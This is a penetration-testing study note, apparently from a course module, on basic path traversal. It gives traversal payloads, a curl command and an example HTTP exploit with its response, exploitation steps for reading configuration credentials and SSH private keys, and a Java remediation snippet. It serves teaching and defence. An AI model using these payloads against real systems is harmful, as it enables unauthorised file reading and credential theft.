---
tags: [vapt, path-traversal, intermediate]
difficulty: beginner
module: "23 - Path Traversal and LFI/RFI"
topic: "23.02 Basic Path Traversal (../../../etc/passwd)"
portswigger_labs: ["File path traversal, simple case"]
---

# 23.02 — Basic Path Traversal (`../../../etc/passwd`)

## What is it?
The most fundamental manifestation of a Path Traversal vulnerability involves directly manipulating a file-fetching parameter using standard `../` (dot-dot-slash) sequences to read a known, sensitive file on the target operating system.

The payload `../../../etc/passwd` is the universal "Hello World" of Path Traversal on Linux/UNIX systems. The `/etc/passwd` file is highly targeted because it is readable by all users on a standard Linux system (meaning the web server process has permission to read it), and its presence immediately confirms that the vulnerability exists and is exploitable. On Windows, the equivalent payload is often `..\..\..\windows\win.ini`.

Think of it like testing a maze. You don't try to find the center immediately; you trace the wall to see if you can find the guaranteed exit. Reading `/etc/passwd` proves you can break out of the intended directory structure.

## ASCII Diagram
```text
[Web Root Directory]
/var/www/html/images/  <-- The app intends to stay here
       │
       ├─ [Payload Step 1: ../]
       │  Moves up to: /var/www/html/
       │
       ├─ [Payload Step 2: ../]
       │  Moves up to: /var/www/
       │
       ├─ [Payload Step 3: ../]
       │  Moves up to: /var/
       │
       ├─ [Payload Step 4: ../]
       │  Moves up to: /  (The Root Directory)
       │
       └─ [Payload Step 5: etc/passwd]
          Dives down into: /etc/passwd
          Result: The application reads and returns the file!
```

## How to Find It
- **Manual steps:**
  1. Browse the web application looking for functionality that displays images, downloads documents, or loads templates.
  2. Inspect the URLs and POST bodies for parameters like `?file=`, `?page=`, `?doc=`, or `/download/xyz`.
  3. Swap the legitimate value with a deep traversal sequence: `../../../../../../../../etc/passwd`.
  4. If the application returns the contents of the password file (a list of users separated by colons), you have successfully executed a basic path traversal.
  5. *Note:* Using too many `../` sequences on Unix/Windows is safe. If you are already at the root directory `/`, executing `cd ..` simply keeps you at `/`. Therefore, using `../../../../../../../../etc/passwd` is a safe bet even if you don't know exactly how deep the web root is.

- **Tool commands with flags explained:**
  Using `curl` to manually test a parameter:
  ```bash
  # The --path-as-is flag is CRITICAL.
  # Without it, curl itself will resolve the ../ sequences locally before sending the request!
  curl -s --path-as-is "https://target.com/image?filename=../../../../../../etc/passwd"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Confirm the vulnerability by reading `/etc/passwd`.
  2. Review the `/etc/passwd` file to identify the user the web server is running as (e.g., `www-data` or `tomcat`) and look for human user accounts.
  3. Use the confirmed vulnerability to hunt for higher-value targets. 
  4. Attempt to read application source code (e.g., `../../../var/www/html/config.php`) to find hardcoded database credentials.
  5. Attempt to read SSH keys for the users you discovered (e.g., `../../../../home/admin/.ssh/id_rsa`).

- **Actual payloads:**
  **Linux Recon Payloads:**
  ```text
  ../../../../../../../../etc/passwd       (User accounts)
  ../../../../../../../../etc/hosts        (Internal network routing)
  ../../../../../../../../etc/issue        (OS Version)
  ```
  **Windows Recon Payloads:**
  ```text
  ..\..\..\..\..\..\..\..\windows\win.ini
  ..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
  ```

- **Real HTTP request/response examples:**
  **Exploit Request:**
  ```http
  GET /view-source?file=../../../../../../../../etc/passwd HTTP/1.1
  Host: target.com
  ```
  **Exploit Response:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: text/plain
  
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  admin:x:1000:1000:admin,,,:/home/admin:/bin/bash
  ```

## Real-World Example
A penetration tester encountered an application with an endpoint: `https://company.com/download.php?file=report2023.pdf`. Realizing this parameter interacted with the filesystem, they modified the URL to `https://company.com/download.php?file=../../../../../../etc/passwd`. The server responded with the `/etc/passwd` file, confirming the vulnerability. The tester noticed a user named `developer`. They then changed the payload to `../../../../../../home/developer/.ssh/id_rsa`. The server returned the private SSH key, allowing the tester to instantly SSH directly into the web server.

## How to Fix It
- **Developer remediation:**
  Do not use user input to construct filesystem paths. Use an indirect map (e.g., a database ID to represent a file). If direct access is required, you must strictly validate that the absolute resolved path begins with the intended base directory.

- **Code snippet:**
  **Java (Secure Path Resolution):**
  ```java
  import java.io.File;
  import java.nio.file.Path;
  import java.nio.file.Paths;

  public class FileHandler {
      public File getSecureFile(String userInput) throws Exception {
          Path basePath = Paths.get("/var/www/html/safe_files/").normalize();
          
          // Resolve the user input against the base path
          Path targetPath = basePath.resolve(userInput).normalize();
          
          // Verify that the resulting path still starts with the base path
          if (!targetPath.startsWith(basePath)) {
              throw new SecurityException("Path traversal attack blocked!");
          }
          
          return targetPath.toFile();
      }
  }
  ```

## Chaining Opportunities
- This vuln + [[10 - Chaining Playbook (Database Credentials)]] → Use the basic traversal to read the web application's configuration files (e.g., `.env`, `wp-config.php`, `web.config`) and steal database connection strings.
- This vuln + [[23.07 LFI to RCE via Log Poisoning]] → Once you confirm you can read files, attempt to read the web server access logs (e.g., `/var/log/apache2/access.log`). If successful, you can inject PHP code into the log file and execute it.

## Related Notes
- [[23.01 What is Path Traversal?]]
- [[23.03 Encoding Bypass for Path Traversal]]
- [[23.05 Local File Inclusion (LFI)]]
